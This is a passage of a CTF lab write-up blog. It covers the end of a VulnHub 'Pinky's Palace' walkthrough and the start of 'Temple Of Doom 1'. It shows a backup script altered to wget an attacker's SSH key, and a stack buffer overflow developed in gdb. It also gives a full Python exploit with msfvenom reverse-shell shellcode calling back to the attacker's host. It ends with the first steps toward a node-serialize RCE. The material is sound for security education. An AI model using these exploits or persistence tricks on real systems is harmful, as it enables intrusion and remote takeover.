<span class="nb">tar </span>cvzf /home/demon/backups/backup.tar.gz /var/www/html
<span class="c">#</span>
<span class="c">#</span>
<span class="c">#</span>
pinky@Pinkys-Palace:~<span class="err">$</span>
</code></pre></div></div>

<p>We add the following instructions to the backup.sh file, this creates the .ssh directory in the demon’s home directory, we download the public key and save it in the .ssh directory, and grant all permissions to the owner.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pinky@Pinkys-Palace:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'mkdir /home/demon/.ssh &amp;&amp;\     
&gt; wget 192.168.179.1/pinky_rsa.pub -O /home/demon/.ssh/authorized_keys &amp;&amp;\ 
&gt; chmod 700 /home/demon/.ssh/authorized_keys'</span> <span class="o">&gt;&gt;</span> /usr/local/bin/backup.sh
</code></pre></div></div>

<p>Then, we start a python web server on port 80.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>We wait a few minutes, and log in via SSH as user demon.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh demon@192.168.179.178 <span class="nt">-i</span> pinky_rsa <span class="nt">-p</span> 4655
Enter passphrase <span class="k">for </span>key <span class="s1">'pinky_rsa'</span>: 
Linux Pinkys-Palace 4.9.0-4-amd64 <span class="c">#1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
demon@Pinkys-Palace:~<span class="err">$</span>
</code></pre></div></div>

<p>By listing the writable files was found a rare binary, which also runs with root permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>demon@Pinkys-Palace:~<span class="nv">$ </span>find / <span class="nt">-writable</span> <span class="nt">-type</span> f 2&gt;/dev/null | egrep <span class="nt">-v</span> <span class="s1">'sys|proc'</span>
/daemon/panel
...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>demon@Pinkys-Palace:~<span class="nv">$ </span>ps aux | <span class="nb">grep</span> /daemon/panel | <span class="nb">head</span> <span class="nt">-n</span> +2
root        479  0.0  0.1   4040   736 ?        Ss   17:58   0:00 /daemon/panel
root        483  0.0  0.0   4040    84 ?        S    17:58   0:00 /daemon/panel
</code></pre></div></div>

<p>We download it to the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>scp <span class="nt">-P</span> 4655 <span class="nt">-i</span> pinky_rsa demon@192.168.179.178:/daemon/panel panel 
Enter passphrase <span class="k">for </span>key <span class="s1">'pinky_rsa'</span>: 
panel                                                           100%   13KB   2.9MB/s   00:00 
</code></pre></div></div>

<p>We grant execution permissions, and execute the binary.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">chmod</span> +x panel
root@kali:~<span class="nv">$ </span>./panel

</code></pre></div></div>

<p>We see that is running locally on port 31337, as on the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/tr0ll2<span class="nv">$ </span>ss <span class="nt">-ntpl</span>
LISTEN         0              5                            0.0.0.0:31337                      0.0.0.0:<span class="k">*</span>            <span class="nb">users</span>:<span class="o">((</span><span class="s2">"panel"</span>,pid<span class="o">=</span>18376,fd<span class="o">=</span>3<span class="o">))</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="binary-exploitation">Binary Exploitation</h3>

<p>With gdb we disassemble the binary and list the functions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gdb <span class="nt">-q</span> ./panel
Reading symbols from ./panel...
<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./panel<span class="o">)</span>
gdb-peda<span class="nv">$ </span>info functions
All defined functions:

Non-debugging symbols:
0x0000000000400718  _init
0x0000000000400740  recv@plt
0x0000000000400750  strcpy@plt
0x0000000000400760  setsockopt@plt
0x0000000000400770  strlen@plt
0x0000000000400780  htons@plt
0x0000000000400790  send@plt
0x00000000004007a0  <span class="nb">printf</span>@plt
0x00000000004007b0  memset@plt
0x00000000004007c0  close@plt
0x00000000004007d0  listen@plt
0x00000000004007e0  <span class="nb">bind</span>@plt
0x00000000004007f0  accept@plt
0x0000000000400800  <span class="nb">exit</span>@plt
0x0000000000400810  <span class="nb">wait</span>@plt
0x0000000000400820  fork@plt
0x0000000000400830  socket@plt
0x0000000000400840  _start
0x0000000000400870  deregister_tm_clones
0x00000000004008b0  register_tm_clones
0x00000000004008f0  __do_global_dtors_aux
0x0000000000400910  frame_dummy
0x0000000000400936  fatal
0x0000000000400964  handlecmd
0x00000000004009ab  main
0x0000000000400b90  __libc_csu_init
0x0000000000400c00  __libc_csu_fini
0x0000000000400c04  _fini
</code></pre></div></div>

<p>The <strong>handlecmd</strong> function in probably taking user input, we disassemble this function to see what it contains.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>disas handlecmd
Dump of assembler code <span class="k">for function </span>handlecmd:
   0x0000000000400964 &lt;+0&gt;:     push   rbp
   0x0000000000400965 &lt;+1&gt;:     mov    rbp,rsp
   0x0000000000400968 &lt;+4&gt;:     add    rsp,0xffffffffffffff80
   0x000000000040096c &lt;+8&gt;:     mov    QWORD PTR <span class="o">[</span>rbp-0x78],rdi
   0x0000000000400970 &lt;+12&gt;:    mov    DWORD PTR <span class="o">[</span>rbp-0x7c],esi
   0x0000000000400973 &lt;+15&gt;:    mov    rdx,QWORD PTR <span class="o">[</span>rbp-0x78]
   0x0000000000400977 &lt;+19&gt;:    lea    rax,[rbp-0x70]
   0x000000000040097b &lt;+23&gt;:    mov    rsi,rdx
   0x000000000040097e &lt;+26&gt;:    mov    rdi,rax
   0x0000000000400981 &lt;+29&gt;:    call   0x400750 &lt;strcpy@plt&gt;
   0x0000000000400986 &lt;+34&gt;:    lea    rax,[rbp-0x70]
   0x000000000040098a &lt;+38&gt;:    mov    rdi,rax
   0x000000000040098d &lt;+41&gt;:    call   0x400770 &lt;strlen@plt&gt;
   0x0000000000400992 &lt;+46&gt;:    mov    rdx,rax
   0x0000000000400995 &lt;+49&gt;:    lea    rsi,[rbp-0x70]
   0x0000000000400999 &lt;+53&gt;:    mov    eax,DWORD PTR <span class="o">[</span>rbp-0x7c]
   0x000000000040099c &lt;+56&gt;:    mov    ecx,0x0
   0x00000000004009a1 &lt;+61&gt;:    mov    edi,eax
   0x00000000004009a3 &lt;+63&gt;:    call   0x400790 &lt;send@plt&gt;
   0x00000000004009a8 &lt;+68&gt;:    nop
   0x00000000004009a9 &lt;+69&gt;:    leave  
   0x00000000004009aa &lt;+70&gt;:    ret
</code></pre></div></div>

<p>We can see the vulnerable function <strong>strcpy</strong>, I will try to cause a crash by sending a string of 200 characters, in gdb-peda it is possible to generate a string with a specified length, and locate the <strong>rip</strong> instruction.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_create 200                                                                                                                                        
<span class="s1">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAU
AArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'</span>  
</code></pre></div></div>

<p>I wrote a python script to send this string of 200 bytes.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>

<span class="n">buf</span><span class="o">=</span> <span class="s">"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'latin'</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Done"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Error"</span><span class="p">)</span>
</code></pre></div></div>

<p>We run the <strong>panel</strong> binary in gdb-peda.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>run                                            
Starting program: /root/pinkyspalace2/panel              
<span class="o">[</span>Attaching after process 197786 fork to child process 197796]
<span class="o">[</span>New inferior 2 <span class="o">(</span>process 197796<span class="o">)]</span>                    
<span class="o">[</span>Detaching after fork from parent process 197786]    
<span class="o">[</span>Inferior 1 <span class="o">(</span>process 197786<span class="o">)</span> detached]
Thread 2.1 <span class="s2">"panel"</span> received signal SIGSEGV, Segmentation fault.                                                                                                     
<span class="o">[</span>Switching to process 197796]                                                                                                                                       
</code></pre></div></div>

<p>We run the script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 fuzz.py             
Done
</code></pre></div></div>

<p>As we can see this has caused a segmentation fault, also we can locate the exactly length to overwrite the return address.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>                                                                                    
RAX: 0xc8                                                                                                                                                           
RBX: 0x0                                                                                                                                                            
RCX: 0x7ffff7ee5e7c <span class="o">(</span>&lt;__libc_send+28&gt;:  cmp    rax,0xfffffffffffff000<span class="o">)</span>                                                                                              
RDX: 0xc8                                                                                                                                                           
RSI: 0x7fffffffd2d0 <span class="o">(</span><span class="s2">"AAA%AAsAABAA</span><span class="nv">$AAnAACAA</span><span class="s2">-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAm
AARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>                                                                                                        
RDI: 0x4                                                                                                                                                            
RBP: 0x41414e4141384141 <span class="o">(</span><span class="s1">'AA8AANAA'</span><span class="o">)</span>                                                                                                                                
RSP: 0x7fffffffd348 <span class="o">(</span><span class="s2">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
RIP: 0x4009aa <span class="o">(</span>&lt;handlecmd+70&gt;:  ret<span class="o">)</span>
R8 : 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x400840 <span class="o">(</span>&lt;_start&gt;:        xor    ebp,ebp<span class="o">)</span>
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10203 <span class="o">(</span>CARRY parity adjust zero sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
   0x4009a3 &lt;handlecmd+63&gt;:     call   0x400790 &lt;send@plt&gt;
   0x4009a8 &lt;handlecmd+68&gt;:     nop
   0x4009a9 &lt;handlecmd+69&gt;:     leave  
<span class="o">=&gt;</span> 0x4009aa &lt;handlecmd+70&gt;:     ret    
   0x4009ab &lt;main&gt;:     push   rbp
   0x4009ac &lt;main+1&gt;:   mov    rbp,rsp
   0x4009af &lt;main+4&gt;:   sub    rsp,0x1050
   0x4009b6 &lt;main+11&gt;:  call   0x400820 &lt;fork@plt&gt;
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0x7fffffffd348 <span class="o">(</span><span class="s2">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0008| 0x7fffffffd350 <span class="o">(</span><span class="s2">"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0016| 0x7fffffffd358 <span class="o">(</span><span class="s2">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0024| 0x7fffffffd360 <span class="o">(</span><span class="s2">"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0032| 0x7fffffffd368 <span class="o">(</span><span class="s2">"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0040| 0x7fffffffd370 <span class="o">(</span><span class="s2">"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0048| 0x7fffffffd378 <span class="o">(</span><span class="s2">"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
0056| 0x7fffffffd380 <span class="o">(</span><span class="s2">"AuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004009aa <span class="k">in </span>handlecmd <span class="o">()</span>
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<p>We locate the exact offset at 120 bytes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_offset jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA found at offset: 120
</code></pre></div></div>

<p>We run the binary again in gdb-peda.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gdb <span class="nt">-q</span> ./panel
Reading symbols from ./panel...           
<span class="o">(</span>No debugging symbols found <span class="k">in</span> ./panel<span class="o">)</span>   
gdb-peda<span class="nv">$ </span>r                               
Starting program: /root/pinkyspalace2/panel
<span class="o">[</span>Attaching after process 10265 fork to child process 10269]
<span class="o">[</span>New inferior 2 <span class="o">(</span>process 10269<span class="o">)]</span>                       
<span class="o">[</span>Detaching after fork from parent process 10265]       
<span class="o">[</span>Inferior 1 <span class="o">(</span>process 10265<span class="o">)</span> detached] 
</code></pre></div></div>

<p>We rebuild the python script, this time adding the offset with 120 A’s and then with 6 B’s, to check if we take control of the return address.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>

<span class="n">buf</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">120</span> <span class="o">+</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">6</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'latin'</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Done"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Error"</span><span class="p">)</span>
</code></pre></div></div>

<p>We run the script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 fuzz.py             
Done
</code></pre></div></div>

<p>As we can see the stack is overwritten with A’s (41 hex equivalent), and the instruction pinter with 6 B’s (42 hex equivalent).</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/40wx <span class="nv">$rsp</span>
0x7fffffffd350: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd360: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd370: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd380: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd390: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd3a0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd3b0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffd3c0: 0x41414141      0x41414141      0x42424242      0x00004242
0x7fffffffd3d0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffd3e0: 0x00000000      0x00000000      0x00000000      0x00000000
gdb-peda<span class="nv">$ </span>x/wx <span class="nv">$rip</span>
0x424242424242: Cannot access memory at address 0x424242424242
</code></pre></div></div>

<p>Then, we find the address <strong>0x400cfb</strong> which jumps to the stack.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>jmpcall 
0x400728 : call rax
0x400895 : jmp rax
0x4008e3 : jmp rax
0x40092e : call rax
0x400cfb : call rsp
0x400d6b : call <span class="o">[</span>rax]
</code></pre></div></div>

<p>The next step is to generate a shellcode of no more than 120 bytes, luckily for us the following msfvenom command generated a shellcode of 119 bytes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">--platform</span> linux <span class="nt">-a</span> x64 <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.179.1 <span class="nv">lport</span><span class="o">=</span>443 <span class="nt">-e</span> x64/xor <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> py <span class="nt">-o</span> shellcode
</code></pre></div></div>

<p>We rebuild our shellcode again adding first 1 NOP (\x90), then the shellcode (119 bytes), and finally the <strong>call rsp</strong> address, as shown in the following script.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"192.168.179.178"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>

<span class="n">buf</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xef\xff\xff\xff\x48\xbb\x40\xb0\xfc\x68\x52\x27\xde</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xcb\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x2a\x99\xa4\xf1\x38\x25\x81\xa1\x41\xee\xf3\x6d\x1a</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xb0\x96\x72\x42\xb0\xfd\xd3\x92\x8f\x6d\xca\x11\xf8</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x75\x8e\x38\x37\x84\xa1\x6a\xe8\xf3\x6d\x38\x24\x80</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x83\xbf\x7e\x96\x49\x0a\x28\xdb\xbe\xb6\xda\xc7\x30</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xcb\x6f\x65\xe4\x22\xd9\x92\x47\x21\x4f\xde\x98\x08</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x39\x1b\x3a\x05\x6f\x57\x2d\x4f\xb5\xfc\x68\x52\x27</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xde\xcb</span><span class="s">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xfb\x0c\x40</span><span class="s">"</span> <span class="c1">#0x400cfb  call rsp
</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'latin'</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Done"</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Error"</span><span class="p">)</span>
</code></pre></div></div>

<p>We set up a netcat listener in our case on port 443, and run the exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 exploit.py
Done
</code></pre></div></div>

<p>We have a root shell, and we can read de root flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.178] 34066
script <span class="nt">-qc</span> /bin/bash /dev/null
root@Pinkys-Palace:/daemon# <span class="nb">cd</span> /root
<span class="nb">cd</span> /root
root@Pinkys-Palace:/root# <span class="nb">ls
ls
</span>root.txt
root@Pinkys-Palace:/root# <span class="nb">cat </span>root.txt
<span class="nb">cat </span>root.txt

 ____  _       _          _     
|  _ <span class="se">\(</span>_<span class="o">)</span>_ __ | | ___   _<span class="o">(</span> <span class="o">)</span>___ 
| |_<span class="o">)</span> | | <span class="s1">'_ \| |/ / | | |// __|
|  __/| | | | |   &lt;| |_| | \__ \
|_|   |_|_| |_|_|\_\\__, | |___/
                    |___/       
 ____       _                   
|  _ \ __ _| | __ _  ___ ___ 
| |_) / _` | |/ _` |/ __/ _ \
|  __/ (_| | | (_| | (_|  __/
|_|   \__,_|_|\__,_|\___\___|

[+] CONGRATS YOUVE PWND PINKYS PALACE!!!!!!   
[+] Flag: 2208f787fcc6433b4798d2189af7424d
[+] Twitter: @Pink_P4nther
[+] Cheers to VulnHub!
[+] VM Host: VMware
[+] Type: CTF || [Realistic]
[+] Hopefully you enjoyed this and gained something from it as well!!!
root@Pinkys-Palace:/root#
</span></code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Temple Of Doom 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>December 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> A CTF machine intended to improve skills in penetration testing.</p>

<p><strong>Author:</strong> 0katz</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/temple-of-doom-1,243/">https://www.vulnhub.com/entry/temple-of-doom-1,243/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>A ping scan on the local network reveals the target machine, the script can be downloaded <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.177 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>Full TCP port scan with nmap detected two open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p1-65535</span> <span class="nt">-T4</span> 192.168.179.177 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT    STATE SERVICE
22/tcp  open  ssh
666/tcp open  doom
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Version detection and script scanning was performed with nmap to discover more information about open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,666 192.168.179.177 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 95:68:04:c7:42:03:04:cd:00:4e:36:7e:cd:4f:66:ea <span class="o">(</span>RSA<span class="o">)</span>
|   256 c3:06:5f:7f:17:b6:cb:bc:79:6b:46:46:cc:11:3a:7d <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 63:0c:28:88:25:d5:48:19:82:bb:bd:72:c6:6c:68:50 <span class="o">(</span>ED25519<span class="o">)</span>
666/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=utf-8).
...
</span></code></pre></div></div>

<h3 id="enumeration-on-port-666">Enumeration on port 666</h3>

<p>Browsing the web page an error message was detected.</p>

<p><img src="/assets/images/templeofdoom/screenshot-1.png" alt="" /></p>

<p><img src="/assets/images/templeofdoom/screenshot-2.png" alt="" /></p>

<p>Researching a little bit about the error was possible to detect a remote code execution vulnerability for this version of node js.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit node serialize
<span class="nt">---------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
 Exploit Title                                                 |  Path
<span class="nt">---------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
Node.JS - <span class="s1">'node-serialize'</span> Remote Code Execution               | linux/remote/45265.js
Node.JS - <span class="s1">'node-serialize'</span> Remote Code Execution <span class="o">(</span>2<span class="o">)</span>           | nodejs/webapps/49552.py
Node.JS - <span class="s1">'node-serialize'</span> Remote Code Execution <span class="o">(</span>3<span class="o">)</span>           | nodejs/webapps/50036.js
<span class="nt">---------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="insecure-deserealization">Insecure Deserealization</h3>

<p>This occurs when untrusted input is passed into unserialize() function in node-serialize module can be exploited to achieve arbitrary code execution by passing a serialized JavaScript Object with an Immediately invoked function expression (IIFE), more information on this topic you can find it <a href="https://medium.com/@chaudharyaditya/insecure-deserialization-3035c6b5766e">here</a>.</p>

<p>We copy this exploit to our current directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> nodejs/webapps/50036.js
</code></pre></div></div>

